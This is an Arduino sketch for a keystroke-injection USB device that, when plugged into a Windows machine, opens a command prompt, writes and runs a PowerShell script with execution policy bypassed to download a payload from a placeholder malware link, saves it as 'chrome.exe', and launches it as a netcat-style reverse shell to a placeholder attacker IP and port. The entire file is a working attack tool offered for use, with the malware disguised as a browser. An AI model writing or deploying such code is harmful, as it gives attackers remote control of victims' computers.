#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(400);
  type(KEY_LEFT_GUI, false);
  type('r', false);
  Keyboard.releaseAll();
  delay(100);
  print(F("cmd"));
  delay(500);
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  delay(800);
  print(F("cd / & mkdir chrome &  cd win & echo (wget 'Direct link for your malware' -outfile chrome.exe) > b.ps1 & powershell -executionpolicy bypass -file b.ps1"));
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  delay(800);
  print(F("start chrome.exe yourIP Port -e cmd.exe -d"));
  delay(800);
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  print(F("exit"));
  delay(800);
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  Keyboard.end();
}
void type(int key, boolean release) {
  Keyboard.press(key);
  if (release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop() {}
